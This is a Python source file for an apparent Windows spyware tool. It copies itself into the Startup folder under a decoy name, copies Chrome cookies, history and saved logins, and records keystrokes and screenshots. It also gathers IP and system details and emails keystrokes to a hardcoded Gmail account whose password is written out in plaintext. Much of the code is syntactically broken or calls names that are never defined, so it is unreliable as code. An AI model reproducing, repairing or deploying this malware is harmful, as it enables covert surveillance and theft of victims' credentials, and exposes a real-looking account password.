# Imported libraries

import os, sys
import errno
import socket
import base64
import pyHook
import shutil
import signal
import smtplib
import getpass
import logging
import platform
import win32api
import pythoncom
import subprocess
import datetime
from PIL import ImageGrab
import urllib.request as urllib
from email import encoders as Encoders
from contextlib import closing
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# -----------------------

global mail
mail = {
		      "to", "marcalexander333@gmail.com",  # To
		    "from", "marcalexander333@gmail.com",  # From
		  "server", "smtp.gmail.com:587",          # SMTP Server:Port
		"username", "marcalexander333",            # User
		"password", "pollasnegras",                # Password
} 

# -----------------------

global typedChars
typedChars = ""

global count_scr
count_scr = 0

global count_letter
count_letter = 0

global count_scremail
count_scremail = 0

global check_count
check_count = 1000

global PUBLIC_ADDRESS
PUBLIC_ADDRESS = ""

global totalNewLines
totalNewLines = 0

global zipfileName
zipfileName = ""

# ------------------------
current_system_time        = datetime.datetime.now()   # Get current system time
# ------------------------
path                       = os.path.join("C:" + os.path.sep, "Users", "Public", "Intel", "Logs")
# ------------------------

path_to_screenshot         = os.path.join(path, "Screenshots")  
path_to_cookies            = os.path.join(path, "ChromeBrowserData")
generated_zipfile_location = os.path.join(path, "ToZipScreenshots")

app_paths = [path, path_to_screenshot, generated_zipfile_location, path_to_cookies]

# Crear los directorios que no existan
for pth in app_paths:
	if not os.path.exists(os.path.join(path, pth)):
		print(f"Creating dir: {pth}")
		os.makedirs(os.path.join(path, pth))

currentdir = os.getcwd()
currentuser = getpass.getuser()

try:
	local_ip_address = socket.gethostbyname(socket.gethostname())
except: pass

# Checks if the computer is connected to Internet
def isInternetConnected():

	print("Checking Internet Connection")

	try:
		response = urllib.urlopen("https://www.google.co.jp")
		return True

	except: 
		return False

def subprocess_args(include_stdout = True):
	if hasattr(subprocess, "STARTUPINFO"):
		si = subprocess.STARTUPINFO()
		si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
		env = os.environ

	else:
		si = None
		env = None

	if include_stdout:
		ret = {"stdout:": subprocess.PIPE}

	else:
		ret = {}

	ret.update({"stdin": subprocess.PIPE,
				"stderr": subprocess.PIPE,
				"startupinfo": si,
				"env": env })
	return ret

# Function to get the Process ID
def getProcessId(process_name):
	return [item.split()[1] for item in os.popen("tasklist").read().splitlines()[4:] if process_name in item.split()]

# Function to get the Public IP
def getSlavePublicAddress():

	print("Getting Public IP Address")

	try:
		return urllib.urlopen("http://ip.42.pl/raw").read()
	except: pass

# Function to get the System information
def getsystemInformation():
	return platform.uname()

# Function to get the output of command ipconfig /all
def getIPConfig():

	print("Getting IP config")

	try:
		ipcfg_file = os.path.join(path, "ipcfg.txt")
		f = open(ipcfg_file, "w")
		f.write(subprocess.check_output(["ipconfig", "/all"], **subprocess_args(False)))
		f.close()

	except Exception as e:
		pass

# Function to combine all the slave information and save in the info.txt file
def getslaveInfo():

	print("Getting slave information")

	slave_info = os.path.join(path, "info.txt")
	open_slave_info = open(slave_info, "w")


	open_slave_info.write("\n------------------------------\n")
	try:
		open_slave_info.write(str(PUBLIC_ADDRESS) + "\n")
	except Exception as e:
		pass

	open_slave_info.write("\n------------------------------\n")
	try:
		open_slave_info.write(" ".join(str(s) for s in getsystemInformation()) + "\n")
	except Exception as e:
		pass

	open_slave_info.close()

	
def copyToStartup():

	print("Copying to startup")

	"""Copy the current executable to MS Windows Startup"""

	original_filename = "sniffer.py"   # TODO: CAMBIAR
	new_filename      = "nyancat.py" # The file will be copied to startup folder by this name

	to  = os.path.join("C:" + os.path.sep, "Users", currentuser ,"AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")

	files_in_destination_dir = os.listdir(to)

	# Comprobar si ya se ha copiado el programa
	if not (new_filename in files_in_destination_dir):
		shutil.copy2(
			os.path.join(currentdir, original_filename), 
			os.path.join(to, new_filename)
		)


def cookieGrabber():

	print("Grabbing Cookies from Chrome")

	"""Obtains Google Chrome Cookies"""

	cookiepath = os.path.join(
		os.environ["HOMEDRIVE"] + os.path.sep, 
		"Users", os.environ["HOMEPATH"].split(os.path.sep)[-1], "AppData", 
		"Local", "Google", "Chrome", "User Data", "Default"
		)

	cookiefile    = "Cookies"
	historyfile   = "History"
	LoginDatafile = "Login Data"

	copycookie    = os.path.join(cookiepath, cookiefile)
	copyhistory   = os.path.join(cookiepath, historyfile)
	copyLoginData = os.path.join(cookiepath, LoginDatafile)

	filesindir = os.listdir(path_to_cookies)

	if copycookie not in filesindir:
		shutil.copy2(copycookie, path_to_cookies)

	if copyhistory not in filesindir:
		shutil.copy2(copyhistory, path_to_cookies)

	if copyLoginData not in filesindir:
		shutil.copy2(copyLoginData, path_to_cookies)


def moveAttachment(filename_or_folder):

	print("Moving Attachments")

	"""Moves all the files to be sent via email to one place"""

	current_files_location = os.path.join(path, filename_or_folder)
	
	if filename_or_folder == "Screenshots":
		files = os.listdir(current_files_location)

		for image in files:
			shutil.move( 
				os.path.join(current_files_location, image), 
				generated_zipfile_location
			)

	else:
		shutil.move(current_files_location, generated_zipfile_location)	

def zipAttachments():

	global zipfileName

	print("Zipping Attachments")

	"""Zips all the attachments in order to prepare them to be sent"""

	zipfileName = f"{PUBLIC_ADDRESS}_{generateTimestamp()}"

	shutil.make_archive(zipfileName, "zip") # TODO: Mejorar (usar zipfile?)


def clearGeneratedZipFolder():
	files_in_dir = os.listdir(generated_zipfile_location)
	for file_ in files_in_dir:
		os.remove(os.path.join(generated_zipfile_location, file_))

def clearScreenshotFolder():
	files_in_dir = os.listdir(path_to_screenshot)
	for file_ in files_in_dir:
		os.remove(os.path.join(path_to_screenshot, file_))

def takeScreenShoot():

	print("Taking Screenshot")

	current_timestamp = generateTimestamp()
	scrimg = ImageGrab.grab()
	scrimg.save(os.path.join(path_to_screenshot, str(current_timestamp) + ".png"))


def sendMail(subject, message, attachment, timestamp = False):
	try:
		global mail
		mail_timestamp = current_system_time.strftime("%m%d-%H%M")

		if timestamp == True:
			SUBJECT = f"{mail_timestamp} | {subject}"
		else:
			SUBJECT = subject
		)
		MESSAGE = message

		if attachment["exists"] == True:
			file_to_be_sent = open(attachment["file_path"], "rb")
			payload = MIMEBase("multipart", "encrypted") 
			payload.set_payload(file_to_be_sent.read())
			encoders.encode_base64(payload)
			payload.add_header("Content-Disposition", "attachment", filename = attachment["file_path"])
			msg.attach(payload) 
		
		# Actually send the email
		msg = MIMEMultipart() 
		msg["To"] = mail["to"]
		msg["From"] = mail["from"]
		msg["Subject"] = SUBJECT
		msg.attach( MIMEText( MESSAGE, # TODO: Convertir a str
			"plain")) 

		server = smtplib.SMTP(mail["server"]) 
		server.ehlo()
		server.starttls() 				
		server.login(mail["username"], mail["password"]) 
		server.sendmail(mail["to"], mail["from"], msg.as_string()) 								
		server.quit()
		server.close()

def sendMailNotification(notification_text):
	attachment = {"exists" : False, "file_path" : ""}
	subject = f"Notification from {PUBLIC_ADDRESS}"
	sendMail(subject, notification_text, attachment, timestamp = True)

def generateTimestamp():
	return current_system_time.strftime("%d/%m/%Y-%H|%M|%S")

def OnKeyboardEvent(event):

	global totalTypedChars
	global typedChars
	global totalNewLines

	if event.Ascii == 8: # Borrar (\b)
		typedChars = typedChars[:-1]
		
	elif event.Ascii == 9: # Tabulador (\t)
		typedChars += "\t"

	elif event.Ascii == 10: # Salto de linea (\n)
		typedChars += "\n"
		totalNewLines += 1
		
	elif event.Ascii >= 32 and event.Ascii <= 127:
		typedChars += chr(event.Ascii)

	totalTypedChars += 1

	if totalTypedChars % 250 == 0:
		# Enviar correo con las pulsaciones del teclado cada
		# 250 pulsaciones, para evitar dejar rastro, lo mejor
		# es evitar utilizar archivos auxiliares

		subject = f"Keystrokes from {PUBLIC_ADDRESS}"
		attachment = {"exists" : False, "file_path" : ""}

		sendMail(subject, typedChars, attachment, timestamp = True)

def createPayload():
	try:
		files_in_current_dir = os.listdir()
		moveAttachment("info.txt")
		

	
	except Exception as exc:
		print(str(exc))	

def startHackTool():

	print("Booting...")
	print("Welcome")
	
	global PUBLIC_ADDRESS

	try:
		copyToStartup() # Quite descriptive I think xd
	except Exception as exc:
		print(str(exc))

	os.chdir(path)

	if isInternetConnected() == True: # Cool, now let"s go

		try:
			PUBLIC_ADDRESS = getSlavePublicAddress()
		except:
			PUBLIC_ADDRESS = "E.RR.O.R"

		sendMailNotification("Everything seems fine, connection established\nNow executing payloads!\nStay tunned for more info!")
			
		# Obtener Cookies
		try:
			cookieGrabber()
		except Exception as exc:
			print(str(exc))

		# Ipconfig
		try:
			getIPConfig()
		except Exception as exc:
			print(str(exc))

		# Slave Information
		try:
			getslaveInfo()
		except Exception as exc:
			print(str(exc))

startHackTool()

print("Starting Hooks...")

hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
hm.HookKeyboard()
pythoncom.PumpMessages()
	

